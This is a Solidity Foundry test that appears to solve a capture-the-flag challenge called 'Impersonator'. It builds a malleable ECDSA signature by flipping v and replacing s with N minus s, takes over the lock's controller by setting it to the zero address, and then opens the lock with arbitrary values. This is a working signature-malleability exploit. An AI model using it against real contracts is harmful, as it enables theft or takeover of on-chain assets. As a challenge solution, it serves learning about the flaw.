// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test, console} from "forge-std/Test.sol";
import {Impersonator, ECLocker} from "./Impersonator.sol";

contract SolveImpersonator is Test {
    /// Storage
    Impersonator target;
    ECLocker lock;
    uint256 constant LOCK_START_ID = 1336;
    uint256 constant N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;

    function setUp() public {
        address deployer = makeAddr("deployer");
        vm.startPrank(deployer);

        target = new Impersonator(LOCK_START_ID);

        bytes memory signature =
            hex"1932CB842D3E27F54F79F7BE0289437381BA2410FDEFBAE36850BEE9C41E3B9178489C64A0DB16C40EF986BECCC8F069AD5041E5B992D76FE76BBA057D9ABFF2000000000000000000000000000000000000000000000000000000000000001B";

        target.deployNewLock(signature);
        lock = target.lockers(0);
    }

    function testSolveImpersonator() public {
        address player = makeAddr("alice");
        vm.startPrank(player);

        uint8 v = 0x1B;
        bytes32 r = hex"1932CB842D3E27F54F79F7BE0289437381BA2410FDEFBAE36850BEE9C41E3B91";
        bytes32 s = hex"78489C64A0DB16C40EF986BECCC8F069AD5041E5B992D76FE76BBA057D9ABFF2";

        uint8 vbar = v == 27 ? 28 : 27;
        bytes32 sbar = bytes32(N - uint256(s));

        console.log(vbar);
        console.logBytes32(sbar);

        lock.changeController(vbar, r, sbar, address(0));

        // Now the lock can be open by pretty much any (v,r,s) set
        lock.open(0, bytes32(uint256(1)), bytes32(uint256(2)));
    }
}
